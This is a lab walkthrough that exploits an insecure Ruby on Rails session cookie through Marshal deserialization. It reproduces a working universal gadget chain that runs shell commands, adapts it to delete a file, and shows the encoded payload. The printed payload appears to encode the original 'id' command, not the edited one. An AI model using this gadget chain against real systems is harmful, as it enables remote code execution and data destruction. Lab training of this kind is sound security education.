# Lab: Exploiting Ruby deserialization using a documented gadget chain

 This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

**Hint**

Try searching for "ruby deserialization gadget chain" online. 

**References**

From the hint, I found the following blogpost to help me with the lab:

Blog by vakzz: [devcraft.io](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

# Step 1 inspect session cookie

In the target tab, I see that burp has identified a Serialized object within an HTTP message:

![image](https://user-images.githubusercontent.com/83407557/213926870-156f57ff-ade9-4b1b-b353-abcfb50ac87e.png)

Sending the cookie to decoder I can see that this is a ruby serialized object:

![image](https://user-images.githubusercontent.com/83407557/213926929-b2cbf729-73b8-4aad-95f5-e6342c967ee1.png)

If I modify the cookie, I can get an error that confirms ruby:

![image](https://user-images.githubusercontent.com/83407557/213928104-dbb4edb6-a3c5-4a40-adc9-c6187b6884b5.png)

![image](https://user-images.githubusercontent.com/83407557/213928117-d7f25bbe-7ce0-46ad-92bb-e3ab0f01a0b7.png)

![image](https://user-images.githubusercontent.com/83407557/213928148-9cd9b149-1bd9-402e-9016-8c1b1c1d2866.png)



# Step 2 Find a malicous serialized object gadget chain

I take the following code that I found from the [blog](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html):
```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

This code is running the id command, it also isn't base64 encoding the payload. I change the script to run the `rm /home/carlos/morale.txt`. From the documentation on ruby:

![image](https://user-images.githubusercontent.com/83407557/213928313-02d30992-42b8-4afe-913a-260e96605157.png)



so to make the script output a base64 encoded payload and run the correct command, I update the script with the following changes:

```ruby
require "base64"
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
#puts payload.inspect
#puts Marshal.load(payload)
```

# Step 3 Run ruby script, and inject session cookie

I run the ruby script that I just edited to create the payload:

```bash
└─$ ruby ruby_gadget_chain.rb
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIgdpZAY7DFQ7EjoMcmVzb2x2ZQ==
```

And then inject it via the session cookie:

![image](https://user-images.githubusercontent.com/83407557/213927918-bdf9b1ce-8553-4f1c-82e7-ee740d293f94.png)

While this causes an error in the webapp, it also deletes the target file, and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/213927954-11cd3e79-86e5-4f95-8705-8f554816011c.png)





